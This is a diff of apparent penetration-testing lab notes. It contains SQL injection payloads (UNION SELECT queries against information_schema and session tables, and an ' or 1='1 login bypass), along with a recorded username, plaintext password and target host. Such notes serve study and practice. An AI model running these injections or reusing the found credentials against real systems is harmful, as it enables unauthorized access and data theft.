@@ -170,7 +170,7 @@ SQL Injection            in the URL
                                 Audi' UNION SELECT tireid,name,size,cost,color,year,5 from session.Tires #
         GET METHOD                      
               change url to find vulnerable field, remove up to the char that changes everytime a different selction is made, add <UNNION SELECT 1,2,3> (cause of the 3 columns that show up normaly)
-              modify golden statement: Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
+              modify golden statement: Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns #
               craft query: Selection=2 UNION SELECT start,status,last_access from session.session_log            #put this into after the ?
 
 
@@ -539,6 +539,8 @@ http://127.0.0.1:1113/admin.html >> ' or 1='1 >>
 system_user=user2            user2:x:1002:1003::/home/user2:/bin/sh
 user_password=TurkeyDay24
 found 192.168.28.175 BestWebApp 2222 ssh 8000 html
+
+
 
 
 
